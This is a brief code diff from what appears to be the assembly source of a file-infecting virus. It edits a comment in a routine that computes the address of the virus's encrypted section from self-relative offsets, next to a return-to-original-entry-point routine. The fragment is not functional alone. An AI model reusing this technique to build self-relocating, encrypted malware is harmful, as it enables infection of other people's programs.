@@ -57,7 +57,7 @@ _ret2oep:
 
 _getencryptedsectionaddr:
     call _get_rip
-    sub rax, 0x66666666 ; virus size without ret2oep
+    sub rax, 0x66666666 ; virus size without getencryptedsectionaddr
     sub rax, 0x66666666 ; new_entry_point
     add rax, 0x66666666 ; start of encrypted section
     ret
